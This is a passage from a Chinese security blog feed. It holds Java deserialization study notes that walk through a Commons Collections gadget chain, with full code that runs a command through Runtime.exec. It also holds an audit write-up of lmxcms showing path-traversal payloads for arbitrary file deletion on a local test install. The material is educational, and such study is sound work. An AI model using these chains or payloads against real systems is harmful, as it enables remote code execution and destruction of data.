title="image-20220724015754541"><p>手动复制payload打</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220724015921920.png" class title="image-20220724015921920">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;初学SpringBoot框架，找了个开源项目练习一下学到的审计技巧，这次审计的是github上的一个开源OA项目，项目地址：&lt;a href=&quot;https://github.com/kalvinGit/kvf-admin%EF%BC%8C%E9%A1%B9%E7%9B%AE%</summary>
      
    
    
    
    
    <category term="-Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java安全学习记录</title>
    <link href="https://men9da.cn/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://men9da.cn/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2022-07-15T03:14:39.000Z</published>
    <updated>2022-07-24T14:11:35.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本文章是对<a href="https://javasec.org/%E9%98%85%E8%AF%BB,%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95">https://javasec.org/阅读,学习的笔记记录</a></p><p>[TOC]</p><h1 id="JAVA基础"><a href="#JAVA基础" class="headerlink" title="JAVA基础"></a>JAVA基础</h1><h3 id="sun-misc-Unsafe"><a href="#sun-misc-Unsafe" class="headerlink" title="sun.misc.Unsafe"></a>sun.misc.Unsafe</h3><h6 id="allocateInstance方法"><a href="#allocateInstance方法" class="headerlink" title="allocateInstance方法"></a>allocateInstance方法</h6><p>Unsafe类是java的一个底层api，我们不可以直接实例化他，但是可以通过反射去获取他，Unsafe类中的allocateInstance方法可以无视构造方法创建实例,在我么们不能通过反射去创建对应实例时就可以通过这个方法绕过限制</p><p>正常情况下我们去获取一个test类的实例时这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnsafeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获取构造函数</span></span><br><span class="line">        Constructor constructor = test.class.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">//设置权限</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取test类实例</span></span><br><span class="line">        test testinstance = (test)constructor.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用Unsafe类是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnsafeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获取Unsafe类构造函数</span></span><br><span class="line">        Constructor constructor = Unsafe.class.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">//设置权限</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//得到Unsafe类实例</span></span><br><span class="line">        Unsafe unsafe = (Unsafe) constructor.newInstance();</span><br><span class="line">        <span class="comment">//通过unsafe.allocateInstance()无视构造函数获得实例</span></span><br><span class="line">        test testinstance = (test) unsafe.allocateInstance(test.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="defineClass方法"><a href="#defineClass方法" class="headerlink" title="defineClass方法"></a>defineClass方法</h6><p>在ClassLoader中的defindClasee方法可以调用来定义一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br></pre></td></tr></table></figure><p>如果ClassLoader被限制,unsafe中也有这么样的一个方法,可以直接调用JVM创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsafe1.defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br></pre></td></tr></table></figure><p>此方法只适用于java8以前的版本</p><p>java8中需要传入传类加载器和保护域</p><h3 id="ApacheCommonsCollection-ChainedTransformer-命令执行"><a href="#ApacheCommonsCollection-ChainedTransformer-命令执行" class="headerlink" title="ApacheCommonsCollection(ChainedTransformer)命令执行"></a>ApacheCommonsCollection(ChainedTransformer)命令执行</h3><h6 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h6><p>学习ChainedTrandformer之前首先需要学习一个类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br></pre></td></tr></table></figure><p>InvokerTransformer类的transform方法实现了方法的动态调用，因此可以通过反射来执行任意代码</p><p>首先我们看到InvokerTransformer的transform方法</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220721232907233.png" class title="image-20220721232907233"><p>可以看到transform方法接受一个Object参数，获取传入的Object的类型类对象Class cls = input.getClass()然后调用反射,获取方法名并调用</p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransFormerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;cmd&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new了一个InvokerTransformer对象，并且传入了三个参数，</p><p>“exec”,new Class[]{String.class},new Object[]{cmd}</p><p>我们来看一下InvokerTransformer的构造函数，可以看到我们传入的三个参数分别对应iMethodName(方法名:exec),iParamTypes(参数类型:String),iArgs(参数值:cmd)</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220721233229204.png" class title="image-20220721233229204"><p>紧接着执行invokerTransformer.transform(Runtime.getRuntime());就会通过反射调用Runtime.getRuntime()类的exec()方法,参数为String cmd;完成命令执行</p><h6 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a><strong>ChainedTransformer</strong></h6><p>ChainedTransformer就是可以链式的执行多个InvokerTransformer类，通过多个反射连锁反应达到最终的目的</p><p>先来看看ChainedTransformer.transform方法,可以发现会遍历iTransformers数组，iTransformers里面就是一堆InvokerTransformer对象，分别调用每个InvokerTransformer的transform方法,并且将上一次调用获得的对象当作下一次调用传入的对象(链式调用)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransFormerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 定义需要执行的本地系统命令</span></span><br><span class="line">        String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//getMethod(&quot;methodname&quot;,paramsType)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//invoke(class,args...)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//exec(&quot;cmd&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Object transform = transformedChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们定义了四个Transformer,为1个ConstantTransformer,3个InvokerTransformer组成的Transformer类型数组,并且将其传入ChainedTransformer的构造函数中，在执行</p><p>Object transform = transformedChain.transform(null);时，我们的四个Transformer将会被依次调用</p><p>他们的调用逻辑是这样的:</p><p>第一次：调用ConstantTransformer的transform，</p><p>第二次:调用InvokerTransformer1的transform，</p><p>第三次:调用InvokerTransformer2的transform，</p><p>第四次:调用InvokerTransformer3的transform，</p><p>我们分别来看看这个过程到底发生了什么</p><p>第一次：调用ConstantTransformer的transform，直接返回了传入的对象,我们传入的是Runtime.class,这里直接返回了,看似没有任何作用,其实此时的Runtime.class已经在ConstantTransformer构造函数中变为ConstantTransformer的iConstant属性,才能在调用ConstantTransformer.transform时返回Runtime.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次结果：返回了Runtime.class,即将传入第一次调用InvokerTransformer中的Object</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220721235801066.png" class title="image-20220721235801066"><p>第二次:调用InvokerTransformer1.transform(Runtime.class)</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220721235901584.png" class title="image-20220721235901584"><p>此时反射调用java.lang.Runtime.class.getMethod(“getRuntime”,null)，返回java.lang.Runtime.getRuntime()方法</p><p>第三次:调用InvokerTransformer2.transform(java.lang.Runtime.getRuntime())</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722000102337.png" class title="image-20220722000102337"><p>此时反射调用java.lang.Runtime.getRuntime()方法的invoke方法,而此时getRuntime()为静态方法，将直接返回其结果，返回Runtime实例</p><p>对于此有疑问的可以参考如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class s = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method m = s.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">System.out.println(m.invoke(<span class="keyword">null</span>,<span class="keyword">null</span>));<span class="comment">//静态方法的invoke不需要实例化,invoke为null</span></span><br></pre></td></tr></table></figure><p>第四次：调用InvokerTransformer2.transform(Runtime())</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722000513837.png" class title="image-20220722000513837"><p>直接反射调用Runtime()类的exec方法,参数为执行的命令,至此四次链式调用完成</p><h6 id="org-apache-commons-collections-map-TransformedMap"><a href="#org-apache-commons-collections-map-TransformedMap" class="headerlink" title="org.apache.commons.collections.map.TransformedMap"></a>org.apache.commons.collections.map.TransformedMap</h6><p>TransformedMap类间接的实现了java.util.map接口，调用TransformedMap.decorate方法就可以创建一个TransformedMap对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用TransformedMap的setVaule/put/putAll就会执行InvokerTransformer类的transform方法，从而触发命令执行</p><p>eg：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ApacheCommonsCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//getMethod(&quot;methodname&quot;,paramsType)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//invoke(class,args...)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//exec(&quot;cmd&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map transformerMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Object obj:transformerMap.entrySet())&#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上面分析ChainedTransformer命令执行一样,生成一个transformers,包含我们的调用链，创建ChainedTransformer对象，不一样的地方在下面这几行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   Map map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">   map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">   Map transformerMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">//调用transformerMap.put()方法也能导致命令执行</span></span><br><span class="line">   <span class="keyword">for</span>(Object obj:transformerMap.entrySet())&#123;</span><br><span class="line">       Map.Entry entry = (Map.Entry) obj;</span><br><span class="line">       entry.setValue(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>生成一个map，在调用TransformedMap.decorate转换为TransformedMap对象,传入三个参数，其中第三个参数是我们的chainedTransformer</p><p>跟进entry.setVaule(”1“),可以看到调用了TransformedMap的checkSetValue方法</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722094803900.png" class title="image-20220722094803900"><p>进一步调用valueTransformer.transform方法,此时的valueTransformer就是我们生成的chainedTransformer</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722094839730.png" class title="image-20220722094839730"><p>接下来就进入chainedTransformer的链式调用，从而导致命令执行</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722095022835.png" class title="image-20220722095022835"><p>调用transformerMap.put()方法也能导致命令执行</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722095413482.png" class title="image-20220722095413482"><p>跟进transformValue方法同样可以执行transform方法,此时的valueTransformer是chainedTransformer</p><img src="/2022/07/15/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220722095454382.png" class title="image-20220722095454382"><h6 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h6><p>在分析完</p><p>1.InvokerTransformer.transform()可以通过反射执行命令</p><p>2.ChainedTransformer.transform()可以链式执行InvokerTransformer.transform()从而执行命令</p><p>3.TransformedMap可以调用put/setValue/putAll执行ChainedTransformer.transform()从而执行InvokerTransformer.transform()从而执行命令</p><p>那么现在有一个问题，这和我们的反序列化又有什么关系呢?他们都是特定情况下构造的特定代码，接下来就需要学习AnnotationInvocationHandler，前面的都是为了他做铺垫;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler类实现了InvocationHandler,Serializable接口，并且重写了readObject方法</p><p>正是因为在readObject方法中调用了TransformedMap的MapEntry的setValue()方法从而完成了从反序列化到命令执行的过程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;本文章是对&lt;a href=&quot;https://javasec.org/%E9%98%85%E8%AF%BB,%E5%AD%A6%E4%</summary>
      
    
    
    
    
    <category term="java安全基础" scheme="https://men9da.cn/tags/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>记一次lmxcms审计</title>
    <link href="https://men9da.cn/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/"/>
    <id>https://men9da.cn/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-06-08T11:59:53.000Z</published>
    <updated>2022-06-08T12:05:19.056Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>1.这是参加四叶草安全的安全研究岗位面试考试,当时面试官发了我一套lmxcms的源码,让我进行审计,尽可能找出更多的漏洞,当时的结果旧纪录下来了,想着审都审了就做做个记录吧,上传到博客上来</p><h1 id="0x01-后台文件管理处存在任意文件删除漏洞"><a href="#0x01-后台文件管理处存在任意文件删除漏洞" class="headerlink" title="0x01:后台文件管理处存在任意文件删除漏洞"></a>0x01:后台文件管理处存在任意文件删除漏洞</h1><p><a href="http://127.0.0.1:83/admin.php%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%A4%84">http://127.0.0.1:83/admin.php后台文件管理处</a></p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420100845042.png" class title="image-20220420100845042"><p>随便选择一个图片,抓包,可以看到路径是用户输入的参数</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420100934795.png" class title="image-20220420100934795"><p>对应的源码对应位置是</p><p>\m\FileModel.class.php,可以看到delete函数中的$data参数是传递过来的$_POST数组,</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420101154801.png" class title="image-20220420101154801"><p>在$path[]=trim($fileInfo[1],”/“);处可以看到将$fileinfo[1]两侧的/移除了,然后在通过delteModel在数据库中删除对应fid后,将未经判断和过滤的$path直接使用unlink删除</p><p>这个时候就可以构造payload进行任意文件删除了</p><p>payload需要满足的条件是</p><p>payload必须形如:数字#####path</p><p>#####前面的数字是要满足parent:deleteModel()方法的中的数据库删除语句,如果此处没有数据或者数据或者数据不是数字,会导致sql查询失败,if条件不成立,无法进入unlink删除</p><p>如果没有#####,$fileinfo[1]就会是空,如下图所示,那么往下的$path[]=trim($fileInfo[1],”/“)的$path[]也会为空,就无法触发到unlink进行文件删除</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420102540468.png" class title="image-20220420102540468"><p><strong>验证:</strong></p><p>在web根目录放置target.txt</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420102723221.png" class title="image-20220420102723221"><p>构造payload:123#####../target.txt</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420103840663.png" class title="image-20220420103840663"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420103814154.png" class title="image-20220420103814154"><p>成功删除</p><h1 id="0X02-后台删除sql备份文件处存在任意文件删除"><a href="#0X02-后台删除sql备份文件处存在任意文件删除" class="headerlink" title="0X02:后台删除sql备份文件处存在任意文件删除"></a>0X02:后台删除sql备份文件处存在任意文件删除</h1><p><strong>位置:系统管理,数据库备份与恢复</strong></p><p>在这个地方可以备份数据库,我们首先点击下方的备份数据</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420131347159.png" class title="image-20220420131347159"><p>数据备份完成后我们在恢复数据处发现可以删除备份文件</p><p>抓包,发现文件名直接就是可控的参数,猜测存在任意文件删除</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420131601241.png" class><p>定位到对应代码逻辑查看是否对filename参数有限制</p><p>\c\admin\BackdbActon.class.php处,$this-?delone是删除逻辑,此时$filename没有过滤</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420131755490.png" class title="image-20220420131755490"><p>跟进后发现仍未过滤,直接将其进行拼接后删除,存在任意文件删除</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420131909198.png" class title="image-20220420131909198"><p>在WWW目录下放置a.txt文件,并且构造filename参数为: ../../../a.txt即可成功删除</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420132027250.png" class title="image-20220420132027250"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420132044049.png" class title="image-20220420132044049"><p>成功删除</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420132114818.png" class title="image-20220420132114818"><h1 id="0X03后台存在任意文件上传漏洞"><a href="#0X03后台存在任意文件上传漏洞" class="headerlink" title="0X03后台存在任意文件上传漏洞"></a>0X03后台存在任意文件上传漏洞</h1><p>后台文件设置处可以设置文件上传类型,对恶意后缀如php等后缀没有限制</p><p>系统管理-&gt;基本设置-&gt;文件设置</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420113409037.png" class title="image-20220420113409037"><p>图片上传处位于:</p><p>内容管理处,随便点击一个关于我们进行编辑,上传php文件</p><img 